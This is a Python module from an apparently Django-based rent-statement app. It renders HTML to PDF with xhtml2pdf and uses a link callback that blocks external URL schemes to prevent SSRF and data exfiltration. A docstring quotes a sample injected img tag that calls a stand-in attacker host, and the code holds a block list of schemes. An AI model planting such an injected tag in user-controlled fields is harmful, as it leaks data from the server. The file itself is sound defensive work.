"""
HTML→PDF rendering via xhtml2pdf.

Security: a `link_callback` blocks every external URL. xhtml2pdf will otherwise
fetch any `<img src>` / `<link href>` / CSS `url(...)` it encounters, which
turns user-controlled fields on the rent statement (tenant name, notes,
care_of, descriptor, building address) into an SSRF + data-exfiltration sink.
"""
import io
import logging
import os
import re

from django.conf import settings
from django.contrib.staticfiles import finders
from django.template.loader import get_template
from xhtml2pdf import pisa

logger = logging.getLogger(__name__)


def _safe_link_callback(uri: str, rel):
    """
    Only allow xhtml2pdf to resolve files we ship ourselves (static + media).

    Returns an absolute filesystem path for whitelisted URIs, or None to make
    xhtml2pdf skip the resource. Any external scheme (http/https/file/ftp/data)
    is refused so a malicious tenant string like `<img src="http://attacker/?p=...">`
    cannot trigger an outbound request from the PDF render.
    """
    if not uri:
        return None

    lowered = uri.lower()
    for scheme in ("http://", "https://", "ftp://", "file://", "data:", "javascript:"):
        if lowered.startswith(scheme):
            logger.warning("pdf_service: blocked external resource %r", uri)
            return None

    static_url = (getattr(settings, "STATIC_URL", "/static/") or "/static/").rstrip("/")
    media_url = (getattr(settings, "MEDIA_URL", "/media/") or "/media/").rstrip("/")

    if static_url and uri.startswith(static_url + "/"):
        rel = uri[len(static_url) + 1:]
        match = finders.find(rel)
        if not match:
            # Under ManifestStaticFilesStorage (production/WhiteNoise) {% static %}
            # emits a hashed name like "logo.a1b2c3d4.png"; the PDF renderer
            # resolves against SOURCE files, which only know the un-hashed name.
            # Strip the hash and retry so the asset (e.g. the letterhead logo)
            # still embeds instead of silently disappearing.
            stripped = re.sub(r"\.[0-9a-f]{8,}(\.\w+)$", r"\1", rel)
            if stripped != rel:
                match = finders.find(stripped)
        if match and os.path.exists(match):
            return match

    if media_url and uri.startswith(media_url + "/"):
        media_root = getattr(settings, "MEDIA_ROOT", "")
        candidate = os.path.normpath(os.path.join(media_root, uri[len(media_url) + 1:]))
        if media_root and candidate.startswith(os.path.abspath(media_root)) and os.path.exists(candidate):
            return candidate

    logger.warning("pdf_service: blocked unknown resource %r", uri)
    return None


def render_to_pdf(template_src, context_dict=None):
    """Render an HTML template into a PDF byte string using xhtml2pdf."""
    if context_dict is None:
        context_dict = {}

    template = get_template(template_src)
    html = template.render(context_dict)
    result = io.BytesIO()

    pdf = pisa.pisaDocument(
        io.BytesIO(html.encode("UTF-8")),
        result,
        encoding="UTF-8",
        link_callback=_safe_link_callback,
    )

    if not pdf.err:
        return result.getvalue()
    return None
